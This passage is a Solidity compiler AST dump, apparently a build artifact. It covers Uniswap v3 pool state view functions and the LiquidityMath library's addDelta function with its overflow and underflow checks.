														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4003:323:8"
									},
									"scope": 2103,
									"src": "3930:397:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2065,
										"nodeType": "StructuredDocumentation",
										"src": "4333:99:8",
										"text": "@notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
									},
									"functionSelector": "5339c296",
									"id": 2072,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tickBitmap",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2068,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2067,
												"mutability": "mutable",
												"name": "wordPosition",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2072,
												"src": "4457:18:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int16",
													"typeString": "int16"
												},
												"typeName": {
													"id": 2066,
													"name": "int16",
													"nodeType": "ElementaryTypeName",
													"src": "4457:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int16",
														"typeString": "int16"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4456:20:8"
									},
									"returnParameters": {
										"id": 2071,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2070,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2072,
												"src": "4500:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2069,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4500:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4499:9:8"
									},
									"scope": 2103,
									"src": "4437:72:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2073,
										"nodeType": "StructuredDocumentation",
										"src": "4515:700:8",
										"text": "@notice Returns the information about a position by the position's key\n @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\n @return _liquidity The amount of liquidity in the position,\n Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,\n Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,\n Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,\n Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
									},
									"functionSelector": "514ea4bf",
									"id": 2088,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "positions",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2076,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2075,
												"mutability": "mutable",
												"name": "key",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2088,
												"src": "5239:11:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 2074,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "5239:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5238:13:8"
									},
									"returnParameters": {
										"id": 2087,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2078,
												"mutability": "mutable",
												"name": "_liquidity",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2088,
												"src": "5312:18:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2077,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5312:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2080,
												"mutability": "mutable",
												"name": "feeGrowthInside0LastX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2088,
												"src": "5344:32:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2079,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5344:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2082,
												"mutability": "mutable",
												"name": "feeGrowthInside1LastX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2088,
												"src": "5390:32:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2081,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5390:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2084,
												"mutability": "mutable",
												"name": "tokensOwed0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2088,
												"src": "5436:19:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2083,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5436:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2086,
												"mutability": "mutable",
												"name": "tokensOwed1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2088,
												"src": "5469:19:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2085,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5469:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5298:200:8"
									},
									"scope": 2103,
									"src": "5220:279:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2089,
										"nodeType": "StructuredDocumentation",
										"src": "5505:749:8",
										"text": "@notice Returns data about a specific observation index\n @param index The element of the observations array to fetch\n @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time\n ago, rather than at a specific index in the array.\n @return blockTimestamp The timestamp of the observation,\n Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,\n Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,\n Returns initialized whether the observation has been initialized and the values are safe to use"
									},
									"functionSelector": "252c09d7",
									"id": 2102,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "observations",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2092,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2091,
												"mutability": "mutable",
												"name": "index",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2102,
												"src": "6281:13:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2090,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6281:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6280:15:8"
									},
									"returnParameters": {
										"id": 2101,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2094,
												"mutability": "mutable",
												"name": "blockTimestamp",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2102,
												"src": "6356:21:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 2093,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "6356:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2096,
												"mutability": "mutable",
												"name": "tickCumulative",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2102,
												"src": "6391:20:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 2095,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "6391:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2098,
												"mutability": "mutable",
												"name": "secondsPerLiquidityCumulativeX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2102,
												"src": "6425:41:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 2097,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "6425:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2100,
												"mutability": "mutable",
												"name": "initialized",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2102,
												"src": "6480:16:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2099,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "6480:4:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6342:164:8"
									},
									"scope": 2103,
									"src": "6259:248:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 2104,
							"src": "240:6269:8"
						}
					],
					"src": "45:6465:8"
				},
				"id": 8
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
					"exportedSymbols": {
						"LiquidityMath": [
							2155
						]
					},
					"id": 2156,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2105,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:9"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 2106,
								"nodeType": "StructuredDocumentation",
								"src": "71:38:9",
								"text": "@title Math library for liquidity"
							},
							"fullyImplemented": true,
							"id": 2155,
							"linearizedBaseContracts": [
								2155
							],
							"name": "LiquidityMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 2153,
										"nodeType": "Block",
										"src": "456:163:9",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													},
													"id": 2118,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 2116,
														"name": "y",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2111,
														"src": "470:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_int128",
															"typeString": "int128"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 2117,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "474:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "470:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 2151,
													"nodeType": "Block",
													"src": "548:65:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint128",
																			"typeString": "uint128"
																		},
																		"id": 2147,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"id": 2144,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 2137,
																						"name": "z",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2114,
																						"src": "571:1:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						},
																						"id": 2143,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 2138,
																							"name": "x",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 2109,
																							"src": "575:1:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 2141,
																									"name": "y",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 2111,
																									"src": "587:1:9",
																									"typeDescriptions": {
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								],
																								"id": 2140,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "579:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint128_$",
																									"typeString": "type(uint128)"
																								},
																								"typeName": {
																									"id": 2139,
																									"name": "uint128",
																									"nodeType": "ElementaryTypeName",
																									"src": "579:7:9",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 2142,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "579:10:9",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"src": "575:14:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"src": "571:18:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint128",
																						"typeString": "uint128"
																					}
																				}
																			],
																			"id": 2145,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "570:20:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": ">=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 2146,
																			"name": "x",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2109,
																			"src": "594:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"src": "570:25:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"hexValue": "4c41",
																		"id": 2148,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "597:4:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_ce8fc98a1432efc8ba166615239eb1702fbbbd0ddab9a5952502a98483035383",
																			"typeString": "literal_string \"LA\""
																		},
																		"value": "LA"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_ce8fc98a1432efc8ba166615239eb1702fbbbd0ddab9a5952502a98483035383",
																			"typeString": "literal_string \"LA\""
																		}
																	],
																	"id": 2136,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		-18,
																		-18
																	],
																	"referencedDeclaration": -18,
																	"src": "562:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 2149,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "562:40:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 2150,
															"nodeType": "ExpressionStatement",
															"src": "562:40:9"
														}
													]
												},
												"id": 2152,
												"nodeType": "IfStatement",
												"src": "466:147:9",
												"trueBody": {
													"id": 2135,
													"nodeType": "Block",
													"src": "477:65:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint128",
																			"typeString": "uint128"
																		},
																		"id": 2131,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"id": 2128,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 2120,
																						"name": "z",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2114,
																						"src": "500:1:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						},
																						"id": 2127,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 2121,
																							"name": "x",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 2109,
																							"src": "504:1:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "-",
																						"rightExpression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 2125,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"nodeType": "UnaryOperation",
																									"operator": "-",
																									"prefix": true,
																									"src": "516:2:9",
																									"subExpression": {
																										"argumentTypes": null,
																										"id": 2124,
																										"name": "y",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 2111,
																										"src": "517:1:9",
																										"typeDescriptions": {
																											"typeIdentifier": "t_int128",
																											"typeString": "int128"
																										}
																									},
																									"typeDescriptions": {
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								],
																								"id": 2123,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "508:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint128_$",
																									"typeString": "type(uint128)"
																								},
																								"typeName": {
																									"id": 2122,
																									"name": "uint128",
																									"nodeType": "ElementaryTypeName",
																									"src": "508:7:9",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 2126,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "508:11:9",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"src": "504:15:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"src": "500:19:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint128",
																						"typeString": "uint128"
																					}
																				}
																			],
																			"id": 2129,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "499:21:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 2130,
																			"name": "x",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2109,
																			"src": "523:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"src": "499:25:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"hexValue": "4c53",
																		"id": 2132,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "526:4:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_2be2231ccd52e7fedf30c30a3dfa3d6c9d9d3400159e305398a7b6d437f56985",
																			"typeString": "literal_string \"LS\""
																		},
																		"value": "LS"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_2be2231ccd52e7fedf30c30a3dfa3d6c9d9d3400159e305398a7b6d437f56985",
																			"typeString": "literal_string \"LS\""
																		}
																	],
																	"id": 2119,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		-18,
																		-18
																	],
																	"referencedDeclaration": -18,
																	"src": "491:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 2133,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "491:40:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 2134,
															"nodeType": "ExpressionStatement",
															"src": "491:40:9"
														}
													]
												}
											}
										]
									},
									"documentation": {
										"id": 2107,
										"nodeType": "StructuredDocumentation",
										"src": "137:241:9",
										"text": "@notice Add a signed liquidity delta to liquidity and revert if it overflows or underflows\n @param x The liquidity before change\n @param y The delta by which liquidity should be changed\n @return z The liquidity delta"
									},
									"id": 2154,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "addDelta",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2112,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2109,
												"mutability": "mutable",
												"name": "x",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2154,
												"src": "401:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2108,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "401:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2111,
												"mutability": "mutable",
												"name": "y",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2154,
												"src": "412:8:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int128",
													"typeString": "int128"
												},
												"typeName": {
													"id": 2110,
													"name": "int128",
													"nodeType": "ElementaryTypeName",
													"src": "412:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "400:21:9"
									},
									"returnParameters": {
										"id": 2115,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2114,
												"mutability": "mutable",
												"name": "z",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2154,
												"src": "445:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2113,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "445:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "444:11:9"
									},
									"scope": 2155,
									"src": "383:236:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 2156,
							"src": "109:512:9"
						}
					],
					"src": "45:577:9"
				},
				"id": 9
			}
		}
	}
}